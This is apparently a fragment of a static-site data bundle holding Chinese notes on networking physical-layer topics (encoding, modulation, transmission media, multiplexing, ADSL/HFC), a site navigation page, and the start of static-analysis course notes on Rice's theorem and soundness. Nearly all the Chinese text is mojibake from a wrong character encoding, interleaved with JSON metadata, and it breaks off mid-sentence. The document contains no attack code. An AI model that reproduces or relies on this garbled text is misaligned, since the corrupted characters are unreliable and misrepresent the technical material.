åååæ¶éä¿¡ï¼å¨åå·¥ - æçµè¯\n\næ¥èªä¿¡æºçä¿¡å·ç§°ä¸ºåºå¸¦ä¿¡å·ï¼å¯¹ä¸åºå¸¦ä¿¡å·çè°å¶åä¸ºä¸¤ç±»ï¼\n\n * åºå¸¦è°å¶ï¼ä»ä»å¯¹æ³¢å½¢è¿è¡åæ¢ï¼ç»æè¿æ¯åºå¸¦ä¿¡å· ï¼ç¼ç ï¼\n * å¸¦éè°å¶ï¼ä½¿ç¨è½½æ³¢çæ¹å¼è¿è¡è°å¶ï¼å°åºå¸¦ä¿¡å·çèå´æ¬è¿å°é«é¢æ®µï¼å¹¶è½¬æ¢ä¸ºæ¨¡æä¿¡å·ï¼è½¬æ¢åçä¿¡å·ç§°ä¸º å¸¦éä¿¡å·ã\n\n# å¸¸ç¨ç¼ç æ¹å¼\n\n * ä¸å½é¶å¶ï¼æ­£1 è´ 0\n * å½é¶å¶ï¼æ­£èå² 1 è´èå² 0\n * æ¼å½»æ¯ç¹ç¼ç ï¼ä½å¨æä¸­å¿çåä¸è·³åä»£è¡¨0ï¼ä½äºå¨æä¸­å¿çåä¸è·³åä»£è¡¨1\n * æ¥åæ¼å½»æ¯ç¹ç¼ç ï¼æ¯ä¸ä½çä¸­å¿é½æè·³åï¼ä½äºå¼å§è¾¹çæè·³åä»£è¡¨0ï¼æ²¡æè·³åä»£è¡¨1\n\n\n\n# åºæ¬çå¸¦éè°å¶æ¹æ³\n\n * è°å¹ï¼æ¯å¹åå\n * è°é¢ï¼è½½æ³¢é¢çåå\n * è°ç¸ï¼ç¸ä½åçåå\n\n\n\n\n# ä¿¡éçæéå®¹é\n\néå¶ç åå¨ä¿¡éä¸çä¼ è¾éççå ç´ ï¼\n\n * ä¿¡éè½å¤éè¿çé¢çèå´ã\n * ä¿¡åªæ¯\n\né¦åå¬å¼ï¼ä¿¡éçå¸¦å®½æèä¿¡éä¸­çä¿¡åªæ¯è¶å¤§ï¼ä¿¡æ¯çæéä¼ è¾éçå°±è¶é«ã\n\n\n# ç©çå±çä¼ è¾åªä»\n\n> ä¼ è¾åªä»å¯ä»¥åä¸ºä¸¤å¤§ç±»ï¼å¯¼å¼åä¼ è¾åªä½ãéå¯¼å¼åä¼ è¾åªä½ã\n\n\n\n\n# å¯¼å¼åä¼ è¾åªä½\n\n# åç»çº¿\n\nå±è½åç»çº¿ï¼STPï¼\n\néå±è½åç»çº¿ï¼UTPï¼\n\n\n\nåç»çº¿çæ åï¼\n\n\n\n# åè½´çµç¼\n\nåè½´çµç¼ç±å¯¼ä½éè´¨è¯çº¿ãç»ç¼å±ãç½ç¶ç¼å¶å¤å¯¼ä½å±è½å±ä»¥åå¡æå¤å±ç»æãæå¹²æ°è½åå¼ºã\n\n\n\n# åç¼\n\nåç¼ä¾é çæ¯åä¼ æ­ä¿¡å·ã\n\n\n\nåå¨åçº¤ä¸­çä¼ æ­æ¯ä¸æ­çå¨åå°å®ç°çã\n\n\n\nåçº¤åä¸ºä¸¤ç§ï¼\n\n * å¤æ¨¡åçº¤\n   \n   å¯ä»¥å­å¨å¤æ¡ä¸åè§åº¦å¥å°çåå¨ä¸æ¡åçº¤ä¸­ä¼ æ­ãéåè¿è·ç¦»ã\n\n * åæ¨¡åçº¤\n   \n   åæ¨¡åçº¤ææ¬é«ï¼æèå°ã\n\n\n\n\n# éå¼å¯¼åä¼ è¾åªä½\n\néå¼å¯¼åä¼ è¾åªä½ä¸»è¦æ¯æ çº¿çµï¼æ çº¿çµçé¢æ®µååå¦ä¸ï¼\n\n * çé«é¢ï¼30-300MHZï¼\n * ç¹é«é¢ï¼300-3GHzï¼\n * è¶é«é¢ï¼3-30GHZï¼\n * æé«é¢ï¼30-300GHZï¼\n\nä¼ ç»çå¾®æ³¢éä¿¡æ¹å¼ä¸»è¦æä¸¤ç§ï¼\n\n * å°é¢å¾®æ³¢æ¥å\n * å«æéä¿¡\n\n\n# ä¿¡éå¤ç¨ææ¯\n\n> å¤ç¨æ¯éä¿¡ææ¯ä¸­çåºæ¬æ¦å¿µãä½¿ç¨å±äº«çä¿¡éä¼ éæ°æ®ã\n\n\n# é¢åå¤ç¨ãæ¶åå¤ç¨ãç»è®¡æ¶åå¤ç¨\n\næåºæ¬çå¤ç¨ææ¯å°±æ¯é¢åå¤ç¨FDMåæ¶åå¤ç¨TDMãé¢åå¤ç¨æç®åï¼ç¨æ·åéå°ä¸å®çé¢å¸¦ä¹åï¼å§ç»å ç¨è¿ä¸ªé¢å¸¦ãæ¶åå¤ç¨åæ¯å°æ¶é´ååä¸ºç­é¿çæ¶åå¤ç¨å¸§TDMå¸§ãæ¯ä¸ªç¨æ·ä½¿ç¨ä¸æ®µæ¶é´çé´éãååæç¨å¨ä¸åçæ¶é´ä½¿ç¨ç¸åçé¢å¸¦å®½åº¦ã\n\n\n\nå¨ä½¿ç¨é¢åå¤ç¨æ¶ï¼å¦æç¨æ·å ç¨çå¸¦å®½ä¸åï¼å½ç¨æ·å¢å¤æ¶ï¼æç¨çä¿¡éæ»å¸¦å®½åå®½ãä½æ¯å¨æ¶åå¤ç¨æ¶ï¼æ¯ä¸ªç¨æ·å¤ç¨çå¸§é¿åº¦æ¶ä¸åçï¼å¦æç¨æ·å¢å¤ï¼åæ¯ä¸ªç¨æ·çåæ¶é´é´éåå¾éå¸¸çªã\n\nå¨è¿è¡éä¿¡æ¶ï¼å¤ç¨å¨ååç¨å¨å¾å¾æå¯¹ä½¿ç¨ã\n\næ¶åå¤ç¨å½æä¸ªç¨æ·å¨æä¸æ¶é´æ®µä¸åéæ°æ®æ¶ï¼ä»ç¶å ç¨TDMå¸§ï¼å æ­¤ä¼é æèµæºæµªè´¹ã\n\n\n\nç»è®¡æ¶åå¤ç¨SRDMæ¯ä¸ç§æ¹è¿çæ¶åå¤ç¨ï¼æé«äºä¿¡éçå©ç¨çã\n\n\n\n\n# æ³¢åå¤ç¨\n\næ³¢åå¤ç¨WDMæ¯åçé¢åå¤ç¨ã\n\n\n# ç åå¤ç¨\n\nç åå¤ç¨CDMæ¯ä¸ç§å±äº«ä¿¡éçæ¹æ³ï¼éå¸¸æ´å¸¸è§çåæ¬¡æ¯CDMAï¼ä½¿ç¨å¨ç§»å¨è®¾å¤ååºç«çéä¿¡ä¸­ã\n\n\n# å®½å¸¦æ¥å¥ææ¯\n\n\n# ADSLææ¯\n\néå¯¹ææ°å­ç¨æ·çº¿ADSLæ¯ç¨æ°å­ææ¯å¯¹ç°æçæ¨¡æçµè¯ç¨æ·çº¿è·¯è¿è¡æ¹é ï¼æ¿è½½æ°å­æ°å­ä¸å¡ã\n\n\n\n\n# åçº¤åè½´æ··åç½ï¼HFCï¼\n\nå¨ç®åè¦çé¢å¾å¹¿çæéçµè§åºç¡ä¹ä¸å¼åçå±æ°æ¥å¥ææ¯ã\n\n\n\n\n# FTTxææ¯\n\nåçº¤å°æ·FTTH",normalizedContent:"# ç©çå±\n\n> ç©çå±å®ä¹äºä¼ è¾åªä»çæºæ¢°ç¹æ§ãçµæ°ç¹æ§ãåè½ç¹æ§ãè¿ç¨ç¹æ§ã\n\n\n# ç©çå±çåºæ¬æ¦å¿µ\n\n> ç©çå±çä½ç¨æ¯å°½å¯è½çå±è½æä¼ è¾åªä»ä¹é´çå·®å¼ï¼ä½¿ç©çå±ä¸é¢çé¾è·¯å±æåä¸å°è¿äºå·®å¼ã\n> \n> ç©çå±å®ä¹äºä¼ è¾åªä»çæºæ¢°ç¹æ§ãçµæ°ç¹æ§ãåè½ç¹æ§ãè¿ç¨ç¹æ§ã\n\n * æºæ¢°ç¹æ§ï¼æ¥å£æç¨çæ¥çº¿å¨çå°ºå¯¸ãå½¢ç¶ãéèãæåãéå®ç­\n * çµæ°ç¹æ§ï¼ææ¥å£çµç¼çå¸éèå´\n * åè½ç¹æ§ï¼çµå¹³çå«ä¹\n * è¿ç¨ç¹æ§ï¼äºä»¶çåçåºç°çé¡ºåºã\n\n\n# æ°æ®éä¿¡åºç¡ç¥è¯\n\n\n# æ°æ®éä¿¡çæ¨¡å\n\nä¸ä¸ªæ°æ®éä¿¡ç³»ç»å¯ä»¥åä¸ºä¸ä¸ªé¨åï¼æºç³»ç»ãç®çç³»ç»ã\n\n\n\néä¿¡çç®çæ¯ä¼ éæ¶æ¯ï¼è¯é³ãæå­ãå¾åãè§é¢ç­ï¼ï¼æ°æ®æ¯è¿éæ¶æ¯çå®ä½ãä¿¡å·æ¯æ°æ®ççµæ°æèçµç£çè¡¨ç°ã\n\nä¿¡å·åä¸ºä¸¤å¤§ç±»ï¼\n\n * æ¨¡æä¿¡å·ï¼è¿ç»­ç\n * æ°å­ä¿¡å·ï¼ç¦»æ£ç\n\n\n# ä¿¡éçåºæ¬æ¦å¿µ\n\nä»éä¿¡åæ¹çä¿¡æ¯äº¤äºå¯ä»¥åä¸ºä¸ç§æ¹å¼ï¼\n\n * ååéä¿¡ï¼åå·¥ - çµè§æºãçµå°\n * ååäº¤æ¿éä¿¡ï¼ååå·¥ - å¯¹è®²æº\n * åååæ¶éä¿¡ï¼å¨åå·¥ - æçµè¯\n\næ¥èªä¿¡æºçä¿¡å·ç§°ä¸ºåºå¸¦ä¿¡å·ï¼å¯¹ä¸åºå¸¦ä¿¡å·çè°å¶åä¸ºä¸¤ç±»ï¼\n\n * åºå¸¦è°å¶ï¼ä»ä»å¯¹æ³¢å½¢è¿è¡åæ¢ï¼ç»æè¿æ¯åºå¸¦ä¿¡å· ï¼ç¼ç ï¼\n * å¸¦éè°å¶ï¼ä½¿ç¨è½½æ³¢çæ¹å¼è¿è¡è°å¶ï¼å°åºå¸¦ä¿¡å·çèå´æ¬è¿å°é«é¢æ®µï¼å¹¶è½¬æ¢ä¸ºæ¨¡æä¿¡å·ï¼è½¬æ¢åçä¿¡å·ç§°ä¸º å¸¦éä¿¡å·ã\n\n# å¸¸ç¨ç¼ç æ¹å¼\n\n * ä¸å½é¶å¶ï¼æ­£1 è´ 0\n * å½é¶å¶ï¼æ­£èå² 1 è´èå² 0\n * æ¼å½»æ¯ç¹ç¼ç ï¼ä½å¨æä¸­å¿çåä¸è·³åä»£è¡¨0ï¼ä½äºå¨æä¸­å¿çåä¸è·³åä»£è¡¨1\n * æ¥åæ¼å½»æ¯ç¹ç¼ç ï¼æ¯ä¸ä½çä¸­å¿é½æè·³åï¼ä½äºå¼å§è¾¹çæè·³åä»£è¡¨0ï¼æ²¡æè·³åä»£è¡¨1\n\n\n\n# åºæ¬çå¸¦éè°å¶æ¹æ³\n\n * è°å¹ï¼æ¯å¹åå\n * è°é¢ï¼è½½æ³¢é¢çåå\n * è°ç¸ï¼ç¸ä½åçåå\n\n\n\n\n# ä¿¡éçæéå®¹é\n\néå¶ç åå¨ä¿¡éä¸çä¼ è¾éççå ç´ ï¼\n\n * ä¿¡éè½å¤éè¿çé¢çèå´ã\n * ä¿¡åªæ¯\n\né¦åå¬å¼ï¼ä¿¡éçå¸¦å®½æèä¿¡éä¸­çä¿¡åªæ¯è¶å¤§ï¼ä¿¡æ¯çæéä¼ è¾éçå°±è¶é«ã\n\n\n# ç©çå±çä¼ è¾åªä»\n\n> ä¼ è¾åªä»å¯ä»¥åä¸ºä¸¤å¤§ç±»ï¼å¯¼å¼åä¼ è¾åªä½ãéå¯¼å¼åä¼ è¾åªä½ã\n\n\n\n\n# å¯¼å¼åä¼ è¾åªä½\n\n# åç»çº¿\n\nå±è½åç»çº¿ï¼stpï¼\n\néå±è½åç»çº¿ï¼utpï¼\n\n\n\nåç»çº¿çæ åï¼\n\n\n\n# åè½´çµç¼\n\nåè½´çµç¼ç±å¯¼ä½éè´¨è¯çº¿ãç»ç¼å±ãç½ç¶ç¼å¶å¤å¯¼ä½å±è½å±ä»¥åå¡æå¤å±ç»æãæå¹²æ°è½åå¼ºã\n\n\n\n# åç¼\n\nåç¼ä¾é çæ¯åä¼ æ­ä¿¡å·ã\n\n\n\nåå¨åçº¤ä¸­çä¼ æ­æ¯ä¸æ­çå¨åå°å®ç°çã\n\n\n\nåçº¤åä¸ºä¸¤ç§ï¼\n\n * å¤æ¨¡åçº¤\n   \n   å¯ä»¥å­å¨å¤æ¡ä¸åè§åº¦å¥å°çåå¨ä¸æ¡åçº¤ä¸­ä¼ æ­ãéåè¿è·ç¦»ã\n\n * åæ¨¡åçº¤\n   \n   åæ¨¡åçº¤ææ¬é«ï¼æèå°ã\n\n\n\n\n# éå¼å¯¼åä¼ è¾åªä½\n\néå¼å¯¼åä¼ è¾åªä½ä¸»è¦æ¯æ çº¿çµï¼æ çº¿çµçé¢æ®µååå¦ä¸ï¼\n\n * çé«é¢ï¼30-300mhzï¼\n * ç¹é«é¢ï¼300-3ghzï¼\n * è¶é«é¢ï¼3-30ghzï¼\n * æé«é¢ï¼30-300ghzï¼\n\nä¼ ç»çå¾®æ³¢éä¿¡æ¹å¼ä¸»è¦æä¸¤ç§ï¼\n\n * å°é¢å¾®æ³¢æ¥å\n * å«æéä¿¡\n\n\n# ä¿¡éå¤ç¨ææ¯\n\n> å¤ç¨æ¯éä¿¡ææ¯ä¸­çåºæ¬æ¦å¿µãä½¿ç¨å±äº«çä¿¡éä¼ éæ°æ®ã\n\n\n# é¢åå¤ç¨ãæ¶åå¤ç¨ãç»è®¡æ¶åå¤ç¨\n\næåºæ¬çå¤ç¨ææ¯å°±æ¯é¢åå¤ç¨fdmåæ¶åå¤ç¨tdmãé¢åå¤ç¨æç®åï¼ç¨æ·åéå°ä¸å®çé¢å¸¦ä¹åï¼å§ç»å ç¨è¿ä¸ªé¢å¸¦ãæ¶åå¤ç¨åæ¯å°æ¶é´ååä¸ºç­é¿çæ¶åå¤ç¨å¸§tdmå¸§ãæ¯ä¸ªç¨æ·ä½¿ç¨ä¸æ®µæ¶é´çé´éãååæç¨å¨ä¸åçæ¶é´ä½¿ç¨ç¸åçé¢å¸¦å®½åº¦ã\n\n\n\nå¨ä½¿ç¨é¢åå¤ç¨æ¶ï¼å¦æç¨æ·å ç¨çå¸¦å®½ä¸åï¼å½ç¨æ·å¢å¤æ¶ï¼æç¨çä¿¡éæ»å¸¦å®½åå®½ãä½æ¯å¨æ¶åå¤ç¨æ¶ï¼æ¯ä¸ªç¨æ·å¤ç¨çå¸§é¿åº¦æ¶ä¸åçï¼å¦æç¨æ·å¢å¤ï¼åæ¯ä¸ªç¨æ·çåæ¶é´é´éåå¾éå¸¸çªã\n\nå¨è¿è¡éä¿¡æ¶ï¼å¤ç¨å¨ååç¨å¨å¾å¾æå¯¹ä½¿ç¨ã\n\næ¶åå¤ç¨å½æä¸ªç¨æ·å¨æä¸æ¶é´æ®µä¸åéæ°æ®æ¶ï¼ä»ç¶å ç¨tdmå¸§ï¼å æ­¤ä¼é æèµæºæµªè´¹ã\n\n\n\nç»è®¡æ¶åå¤ç¨srdmæ¯ä¸ç§æ¹è¿çæ¶åå¤ç¨ï¼æé«äºä¿¡éçå©ç¨çã\n\n\n\n\n# æ³¢åå¤ç¨\n\næ³¢åå¤ç¨wdmæ¯åçé¢åå¤ç¨ã\n\n\n# ç åå¤ç¨\n\nç åå¤ç¨cdmæ¯ä¸ç§å±äº«ä¿¡éçæ¹æ³ï¼éå¸¸æ´å¸¸è§çåæ¬¡æ¯cdmaï¼ä½¿ç¨å¨ç§»å¨è®¾å¤ååºç«çéä¿¡ä¸­ã\n\n\n# å®½å¸¦æ¥å¥ææ¯\n\n\n# adslææ¯\n\néå¯¹ææ°å­ç¨æ·çº¿adslæ¯ç¨æ°å­ææ¯å¯¹ç°æçæ¨¡æçµè¯ç¨æ·çº¿è·¯è¿è¡æ¹é ï¼æ¿è½½æ°å­æ°å­ä¸å¡ã\n\n\n\n\n# åçº¤åè½´æ··åç½ï¼hfcï¼\n\nå¨ç®åè¦çé¢å¾å¹¿çæéçµè§åºç¡ä¹ä¸å¼åçå±æ°æ¥å¥ææ¯ã\n\n\n\n\n# fttxææ¯\n\nåçº¤å°æ·ftth",charsets:{cjk:!0},lastUpdated:"2022/05/06, 15:57:40",lastUpdatedTimestamp:165185266e4},{title:"ç«ç¹å¯¼èª",frontmatter:{title:"ç«ç¹å¯¼èª",date:"2019-12-25T14:27:01.000Z",permalink:"/navigation",article:!1,sidebar:!0,readingShow:"top"},regularPath:"/01.%E7%AB%99%E7%82%B9%E5%AF%BC%E8%88%AA.html",relativePath:"01.ç«ç¹å¯¼èª.md",key:"v-bfe23564",path:"/navigation/",headers:[{level:2,title:"åé¾ç³è¯·",slug:"åé¾ç³è¯·",normalizedTitle:"åé¾ç³è¯·",charIndex:2},{level:2,title:"æç´¢å¼æ",slug:"æç´¢å¼æ",normalizedTitle:"æç´¢å¼æ",charIndex:253},{level:2,title:"ä»£ç æç®¡",slug:"ä»£ç æç®¡",normalizedTitle:"ä»£ç æç®¡",charIndex:262},{level:2,title:"åç«¯å¼å",slug:"åç«¯å¼å",normalizedTitle:"åç«¯å¼å",charIndex:271},{level:2,title:"åç«¯å¼å",slug:"åç«¯å¼å",normalizedTitle:"åç«¯å¼å",charIndex:280},{level:2,title:"ææ¡£å·¥å·",slug:"ææ¡£å·¥å·",normalizedTitle:"ææ¡£å·¥å·",charIndex:289},{level:2,title:"ç­é¨ç¤¾åº",slug:"ç­é¨ç¤¾åº",normalizedTitle:"ç­é¨ç¤¾åº",charIndex:298},{level:2,title:"å·¥å·åé",slug:"å·¥å·åé",normalizedTitle:"å·¥å·åé",charIndex:307},{level:2,title:"ææ¡£æç¨",slug:"ææ¡£æç¨",normalizedTitle:"ææ¡£æç¨",charIndex:316},{level:2,title:"å¨æå¾è¡¨",slug:"å¨æå¾è¡¨",normalizedTitle:"å¨æå¾è¡¨",charIndex:325},{level:2,title:"å¾çå¾æ ",slug:"å¾çå¾æ ",normalizedTitle:"å¾çå¾æ ",charIndex:334},{level:2,title:"CSSæ ·å¼",slug:"cssæ ·å¼",normalizedTitle:"cssæ ·å¼",charIndex:343},{level:2,title:"ç½ç«åæ",slug:"ç½ç«åæ",normalizedTitle:"ç½ç«åæ",charIndex:353},{level:2,title:"å¶å®èµæº",slug:"å¶å®èµæº",normalizedTitle:"å¶å®èµæº",charIndex:362},{level:2,title:"åèæ¥æº",slug:"åèæ¥æº",normalizedTitle:"åèæ¥æº",charIndex:371}],headersStr:"åé¾ç³è¯· æç´¢å¼æ ä»£ç æç®¡ åç«¯å¼å åç«¯å¼å ææ¡£å·¥å· ç­é¨ç¤¾åº å·¥å·åé ææ¡£æç¨ å¨æå¾è¡¨ å¾çå¾æ  CSSæ ·å¼ ç½ç«åæ å¶å®èµæº åèæ¥æº",content:"# åé¾ç³è¯·\n\nä¸æ èç³» æè å¨æ¬é¡µé¢è¯è®ºåºçè¨æ¨çåé¾ä¿¡æ¯ï¼æ ¼å¼ï¼(ç¹å»ä»£ç åå³ä¸è§ä¸é®å¤å¶)\n\n- name: ä¸æ ¡çç©å·é´ # æµç§°\n  desc: æ¬²é¥®æ¡è±åè½½éãç»ä¸ä¼¼å°å¹´æ¸¸ # ä»ç»\n  avatar: https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/avatar.jpg # å¤´å\n  link: https://wiki.pwddd.com/  # é¾æ¥\n\n\n1\n2\n3\n4\n\n\nç³è¯·åè®°å¾åæ·»å æ¬ç«å¦~\n\n\n# æç´¢å¼æ\n\n\n# ä»£ç æç®¡\n\n\n# åç«¯å¼å\n\n\n# åç«¯å¼å\n\n\n# ææ¡£å·¥å·\n\n\n# ç­é¨ç¤¾åº\n\n\n# å·¥å·åé\n\n\n# ææ¡£æç¨\n\n\n# å¨æå¾è¡¨\n\n\n# å¾çå¾æ \n\n\n# CSSæ ·å¼\n\n\n# ç½ç«åæ\n\n\n# å¶å®èµæº\n\n\n# åèæ¥æº\n\nhttps://www.pdai.tech/md/resource/tools.html",normalizedContent:"# åé¾ç³è¯·\n\nä¸æ èç³» æè å¨æ¬é¡µé¢è¯è®ºåºçè¨æ¨çåé¾ä¿¡æ¯ï¼æ ¼å¼ï¼(ç¹å»ä»£ç åå³ä¸è§ä¸é®å¤å¶)\n\n- name: ä¸æ ¡çç©å·é´ # æµç§°\n  desc: æ¬²é¥®æ¡è±åè½½éãç»ä¸ä¼¼å°å¹´æ¸¸ # ä»ç»\n  avatar: https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/avatar.jpg # å¤´å\n  link: https://wiki.pwddd.com/  # é¾æ¥\n\n\n1\n2\n3\n4\n\n\nç³è¯·åè®°å¾åæ·»å æ¬ç«å¦~\n\n\n# æç´¢å¼æ\n\n\n# ä»£ç æç®¡\n\n\n# åç«¯å¼å\n\n\n# åç«¯å¼å\n\n\n# ææ¡£å·¥å·\n\n\n# ç­é¨ç¤¾åº\n\n\n# å·¥å·åé\n\n\n# ææ¡£æç¨\n\n\n# å¨æå¾è¡¨\n\n\n# å¾çå¾æ \n\n\n# cssæ ·å¼\n\n\n# ç½ç«åæ\n\n\n# å¶å®èµæº\n\n\n# åèæ¥æº\n\nhttps://www.pdai.tech/md/resource/tools.html",charsets:{cjk:!0},lastUpdated:"2022/12/08, 01:19:27",lastUpdatedTimestamp:1670462367e3},{title:"SA - Introduction",frontmatter:{title:"SA - Introduction",date:"2022-02-01T00:00:00.000Z",permalink:"/sec/sa/nju/introduction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["éæåæ","åäº¬å¤§å­¦è¯¾ç¨ç¬è®°"],tags:["PL","SA"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/200.%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/2000.%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/00.Introduction.html",relativePath:"02.å®å¨/200.éæåæ/2000.åäº¬å¤§å­¦è¯¾ç¨ç¬è®°/00.Introduction.md",key:"v-290ff5e0",path:"/sec/sa/nju/introduction/",headers:[{level:2,title:"PL and Static Analysis",slug:"pl-and-static-analysis",normalizedTitle:"pl and static analysis",charIndex:19},{level:2,title:"Why We Need Static Analysis?",slug:"why-we-need-static-analysis",normalizedTitle:"why we need static analysis?",charIndex:459},{level:2,title:"What is Static Analysis",slug:"what-is-static-analysis",normalizedTitle:"what is static analysis",charIndex:653},{level:3,title:"Rice's Theorem",slug:"rice-s-theorem",normalizedTitle:"rice's theorem",charIndex:945},{level:3,title:"ä¸¾ä¸ªæ å­è§£ééæåæ",slug:"ä¸¾ä¸ªæ å­è§£ééæåæ",normalizedTitle:"ä¸¾ä¸ªæ å­è§£ééæåæ",charIndex:2234},{level:2,title:"è¯¾ç¨è®¡å",slug:"è¯¾ç¨è®¡å",normalizedTitle:"è¯¾ç¨è®¡å",charIndex:2684},{level:2,title:"ç¸å³èµæº",slug:"ç¸å³èµæº",normalizedTitle:"ç¸å³èµæº",charIndex:2853}],headersStr:"PL and Static Analysis Why We Need Static Analysis? What is Static Analysis Rice's Theorem ä¸¾ä¸ªæ å­è§£ééæåæ è¯¾ç¨è®¡å ç¸å³èµæº",content:"# Introduction\n\n\n# PL and Static Analysis\n\nPL(Programming Languages) åä¸ºä¸é¨åï¼\n\n * çè®º(Theory)\n   * è¯­è¨è®¾è®¡\n   * ç±»åç³»ç»\n   * å½¢å¼è¯­ä¹\n   * ç¨åºé»è¾\n   * è§£å³çé®é¢ï¼æä¹æå»ºè¯­è¨ï¼\n * ç¯å¢(Environment)\n   * ç¼è¯å¨\n   * è¿è¡ç³»ç»\n   * è§£å³çé®é¢ï¼æ¯æè¯­è¨è¿è¡\n * åºç¨(Application)\n   * ç¨åºåæ ï¼ä»PLè§åº¦æ¥çï¼ç¨åºåææçæ¯éæåæ\n   * ç¨åºéªè¯\n   * ç¨åºåæ\n   * è§£å³çé®é¢ï¼å¯é çãå®å¨çãé«æçç¨åº\n\n\n\nå¤å¹´ä»¥æ¥ï¼è¯­è¨çæ ¸å¿é¨åå¹¶æ²¡æå¤ªå¤§çååï¼æ éä¸ç±»ï¼\n\n * å½ä»¤å¼ï¼javaï¼c)ï¼ä¸æ¡ä¸æ¡æä»¤æ§è¡ï¼\n * å½æ°å¼ï¼pythonï¼jsï¼ï¼å°é»è¾åè£å½¢å¼åï¼\n * é»è¾å¼\n\nè¯­ç¨ç¯å¢åçäºååï¼éçéæ±çå¤æåï¼ç¨åºä¹è¶æ¥è¶å¤æãæ°çææå°±æ¯ï¼å¦ä½å»ä¿è¯å¤æçè½¯ä»¶çå¯é æ§ãå®å¨æ§åä¸äºå¶ä»æ§è½ã\n\n\n# Why We Need Static Analysis?\n\néæåæçä½ç¨ï¼\n\n * å¯é æ§ï¼ç©ºæéå¼ç¨ãåå­æ³æ¼ç­\n * åºç¨å®å¨ï¼éç§ä¿æ¤ãæ³¨å¥ç­\n * ç¼è¯ä¼åï¼æåè¿è¡éåº¦ï¼æ­»ä»£ç å é¤ãä»£ç ä½ç½®è°æ´ç­ï¼\n * ç¨åºçè§£ï¼IDEçæç¤ºç­\n\néæåæçå¸åºæå¤å¤§ï¼\n\n\n\nå¥½å¤ä¹ä¸ï¼å¯ä»¥æ´å¥½çæ·±å¥äºè§£ç¼ç¨è¯­è¨çè¯­æ³åè¯­ä¹ãä¹äºä¾¿æ¯èªç¶èç¶çä¼ååºå¯é çãå®å¨çãé«æçç¨åºã\n\n\n# What is Static Analysis\n\n> Static analysis analyzes a program P to reason about its behaviors and determines whether it satisfies some properties before running P.\n\nå¨ç¨åºè¿è¡ä¹åäºè§£ç¨åºç¸å³çè¡ä¸ºï¼å¹¶ä¸å³äºç¨åºç¸å³çæ§è´¨è½å¦å¾å°æ»¡è¶³ãè¯´ç½äºå°±æ¯åä¸ä¸ªåæå¨ï¼å¨è¿è¡ç¨åºä¹ååæç¨åºçè¡ä¸ºãæ¯å¦è¯´ï¼ç¨åºæ¯å¦å­å¨ä¿¡æ¯æ³é²ãç©ºæéå¼ç¨ãå¼ºè½¬æ¯å¦å®å¨ãä»»æçä¸¤ä¸ªåéæ¯å¦æååä¸åå°å(æ¡ä»¶ç«äº)ãæ­»ä»£ç ç­ç­çé®é¢ã\n\n\n# Rice's Theorem\n\n> Unfortunately, by Riceâs Theorem, there is no such approach to determine whether P satisfies such non-trivial properties, i.e., giving exact answer: Yes or No\n\néå¸¸éæ¾çæ¯ å¦Riceå®çæè¨ï¼å¯¹äºä»¥ä¸çé®é¢ï¼ä¸å­å¨ä¸ä¸ªæ¹æ³è½å¤ç»åºä¸ä¸ªåç¡®çå¤æ­ã\n\n> âAny non-trivial property of the behavior of programs in a r.e. language is undecidable.â\n\nr.e. language : éå½å¯æä¸¾çè¯­è¨ï¼ç°ä»£çå ä¹ææè¯­è¨é½æ¯éå½å¯æä¸¾çã æ­£å¸¸çè¯­è¨ç¼åçç¨åºä¸­ï¼ç»åºæä»¬å³æ³¨çé®é¢ï¼ç©ºæéå¼ç¨ç­ï¼çä¸ä¸ªåç¡®çç­æ¡æ¯ä¸å¯è½çã\n\n> A property is trivial if either it is not satisfied by any r.e. language, or if it is satisfied by all r.e. languages; otherwise it is non-trivial.\n\nnon-trival: æä»¬å³æ³¨çè¯¸å¤ç¹æ®çé®é¢ã\n\nä»¥ä¸çç»è®ºåè¯æä»¬ï¼ä¸å­å¨ perfect static analysisã\n\nä¸ä¸ªperfect static analysisï¼æ¯æ¢soundåComplateãä¸¾ä¸ªæ å­ï¼ä¸ä¸ªç¨åºä¸­å­å¨10ä¸ªç©ºæéå¼ç¨çé®é¢ï¼è½ç¶æ ¹æ®Riceå®çï¼ä¸å­å¨ä¸ä¸ªæ¹æ³è½å¤å¾åºè¿ä¸ªç­æ¡ï¼ï¼è¿10ä¸ªé®é¢å°±æ¯Truthçï¼ä½æ¯æä»¬çæ¹æ³å¯ä»¥SoundæèCompleteãSoundçæææ¯ï¼æä»¬å¯ä»¥æ¾å°20ä¸ªï¼åå«10ä¸ªæ­£ç¡®çï¼Completeçæææ¯ï¼æä»¬å¯ä»¥æ¾å°5ä¸ªï¼ä½æ¯è¿5ä¸ªé½æ¯æ­£ç¡®çã\n\n\n\né£ä¹æ¢ç¶ä¸å­å¨perfect static analysisï¼æä»¬çéæåææä»ä¹æä¹ï¼\n\nUseful static analysisï¼å¦¥åå¶ä¸­ä¸æ¹ï¼å¾å°çéæåæç»æ\n\n * Compromise soundness ï¼ (false positives) è¯¯æ¥\n * Compromise completenessï¼(false negatives) æ¼æ¥\n\n\n\nå¨çæ­£çéæåæä¸­ï¼é½æ¯å¦¥åcompleteãå¯ä»¥ä¸ç²¾ç¡®ï¼ä½æ¯ä¸å®è¦soundãå®å¯éæä¸åï¼ä¹ä¸æ¾è¿ä¸ä¸ªã\n\nSoundnesså¯ä»¥çè§£ä¸ºæ­£ç¡®çãåªæå¨å¨é¢åæä¹åï¼ææå¯è½å¾å°ä¸ä¸ªæ­£ç¡®çç»è®ºã\n\n> Static Analysis: ensure (or get close to) soundness, while making good trade-offs between analysis precision and analysis speed.\n\nå®è§çæ¦æ¬éæåæï¼ç¡®ä¿soundnessçæåµä¸ï¼å¨éåº¦åç²¾åº¦ä¸åä¸ä¸ªå¨æçå¹³è¡¡ã\n\n\n# ä¸¾ä¸ªæ å­è§£ééæåæ\n\nåæç¨åºä¸­åéçç¬¦å·ãè½ç¶ç®åï¼ä½æ¯è¿ä¸ªä¾å­å¯ä»¥å¤æ­é¤é¶éè¯¯ãç´¢å¼è¶çç­ã\n\n# æ½è±¡(Abstract)\n\n\n\n# è¿è¿ä¼¼(Over-approximation)\n\nå¨æ½è±¡å¼ä¹ä¸ï¼éå¯¹ç¨åºä¸­çæ¯ä¸ä¸ªè¯­å¥åè½¬æ¢è§åãè½¬æ¢è§åæ ¹æ®ä½ çç®æ 